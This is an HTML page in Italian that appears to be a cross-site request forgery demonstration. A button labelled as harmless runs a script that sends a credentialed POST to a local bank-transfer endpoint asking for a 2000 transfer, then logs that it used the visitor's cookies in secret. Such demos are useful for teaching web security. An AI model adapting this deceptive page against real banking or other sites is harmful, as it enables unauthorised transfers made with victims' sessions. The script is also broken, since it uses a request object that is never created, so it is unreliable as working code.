<html>
    <head>
        <title>Questo è un sito hackerato</title>
        <script>
            function FaiQualcosa() {

                    xhttp.onreadystatechange = function() {
                        if (this.readyState == 4 && this.status == 200) {
                            console.log("Di nascosto ho fatto una post verso il sito della banca con i tuoi cookie")
                        }
                    };
                    xhttp.open("POST", "http://localhost:3000/effettuaBonifico", true);
                    xhttp.setRequestHeader("Content-type", "application/json");
                    xhttp.withCredentials = true;
                    // Richiesta di bonifico
                    var richiesta = {
                        importo: 2000
                    }
                    xhttp.send(JSON.stringify(richiesta));
                }
        </script>
    </head>

        <button onclick="FaiQualcosa()">Una innocua operazione</button>
